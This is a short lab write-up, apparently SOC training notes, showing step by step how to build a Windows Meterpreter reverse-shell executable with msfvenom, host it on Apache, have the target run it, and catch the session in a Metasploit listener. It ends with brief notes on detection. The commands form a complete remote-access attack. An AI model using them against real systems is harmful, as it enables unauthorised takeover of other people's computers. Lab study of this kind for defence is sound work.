# Reverse Shell (Remote Access)

## Objective
- To simulate remote access by creating and executing a payload on the target system.

## Step 1: Create Payload on Kali
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali-IP> LPORT=4444 -f exe -o shell.exe
```

Generates a reverse shell payload for Windows.

(Add screenshot: payload creation)

## Step 2: Start Apache Server
```bash
sudo service apache2 start
```
Starts a web server to host the payload.

(Add screenshot: apache running)

## Step 3: Download Payload on Windows
Open browser on Windows and visit:
```
http://<Kali-IP>/shell.exe
```
Downloads the payload file to the target system.

(Add screenshot: file downloaded)

## Step 4: Start Metasploit Listener
```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <Kali ip>; set LPORT 4444; run"
```
Prepares listener to receive reverse connection.

(Add screenshot: handler running)

## Step 5: Execute Payload on Windows
Run the downloaded `shell.exe` file.
Executes the reverse shell payload.

(Add screenshot: payload executed)

## Step 6: Gain Access on Kali
Once payload executed in target machine, a Meterpreter session is opened.
Provides remote access to the target system.

(Add screenshot: meterpreter session)

## What Happened
- A malicious payload was created and delivered to the target system.
- The target executed the file, establishing a reverse connection.

## SOC Relevance
- Reverse shells indicate full system compromise.
- Detecting suspicious file execution and outbound connections is critical.
